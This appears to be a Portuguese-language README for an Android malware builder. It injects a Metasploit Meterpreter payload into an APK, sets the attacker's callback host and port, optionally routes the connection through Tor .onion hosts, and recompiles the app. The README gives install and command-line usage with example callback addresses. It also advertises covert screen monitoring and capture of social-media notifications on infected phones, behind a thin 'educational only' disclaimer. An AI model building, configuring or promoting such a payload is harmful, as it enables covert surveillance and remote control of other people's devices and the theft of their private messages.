---

Meterpreter-Nous

"Hack the system. Reconfigure. Adapt. Overcome."

Este script modifica e compila um APK personalizado, permitindo configurar conexões dinâmicas com ou sem o uso de Tor.


---

[ SYSTEM CORE ]

Modifica o arquivo Payload.smali para definir um novo host e porta.

Suporte total a hosts .onion para conexões sigilosas via Tor.

Compilação automatizada do APK modificado.



---

[ SYSTEM REQUIREMENTS ]

Certifique-se de possuir as ferramentas essenciais:

Python 3.x

apktool

Java



---

[ INSTALL & DEPLOY ]

Clone o repositório e navegue até o diretório:

git clone https://github.com/mikelkarma/Meterpreter-Nous
cd Meterpreter-Nous
sh install.sh # Debian


---

[ EXECUTION MODE ]

Defina o host e porta diretamente na CLI:

python script.py --host <IP ou domínio> --porta <porta> --tor <true/false>

Exemplos de Execução:

1. Configuração de um host sem Tor:

python script.py --host 192.168.0.1 --porta 8080 --tor false

2. Configuração de um host .onion com Tor:

python script.py --host exemplo.onion --porta 8080 --tor true


---

[ SYSTEM PARAMETERS ]

--host → Define o IP ou domínio para conexão.

--porta → Porta para comunicação remota.

--tor → Define se Tor será utilizado (true/false).



---

[ MOD APK CAPABILITIES ]

Este APK possui capacidades avançadas, incluindo:

Monitoramento em tempo real da tela do Android.

Captura de notificações de redes sociais e outros aplicativos.


Os scripts necessários para ativar essas funções no Metasploit estão disponíveis em msf-scripts. Copie-os para o seu ambiente Metasploit e execute na sessão desejada:

meterpreter> run <script>


---

"No system is safe. The only real security is obscurity."


---

[ DISCLAIMER ]

Este código é disponibilizado apenas para fins educacionais e de pesquisa.

Não há qualquer garantia de funcionamento ou segurança.

O uso deste código é de total responsabilidade do usuário.

Não me responsabilizo por qualquer uso indevido, ilegal ou mal-intencionado deste software.


Se optar por utilizar este código, faça-o de maneira ética e dentro dos limites da lei.


